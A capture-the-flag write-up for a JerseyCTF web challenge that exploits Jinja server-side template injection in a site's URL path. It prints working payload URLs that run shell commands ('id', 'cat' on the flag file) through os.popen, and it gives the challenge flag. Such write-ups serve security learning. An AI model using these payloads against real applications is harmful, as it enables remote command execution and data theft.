# ninja-jackers 
### Description
> Seems like a rogue AI group put up a site to advertise some of their hacking skills. We might be able to find more information on how to stop them if we can find what information is stored somewhere on the web server. Find the vulnerability on this site and get the contents of the flag file!

### Writeup
tl;dr jinja templete injection.

As we can see, `/contact` is reflecting in the webpage. Therefore this is the endpoint we need to fuzz.

As the challenge itself says, it has something to do with injection, I have tried jinja injection (SSTI).

url: `https://jerseyctf-ninja-jackers.chals.io/%7B%7Bself.__init__.__globals__.__builtins__.__import__('os').popen('id').read()%7D%7D`

![](https://i.imgur.com/SysB4F9.png)

and yes, we can get shell or do LFI.

using this payload we can get the flag:
`https://jerseyctf-ninja-jackers.chals.io/%7B%7Bself.__init__.__globals__.__builtins__.__import__('os').popen('cat%20../FLAG_is_H3RE.txt').read()%7D%7D`

Flag: `jctf{Ar3Nt_Y0U_GLaD_I_Didnt_SAY_NINJA}`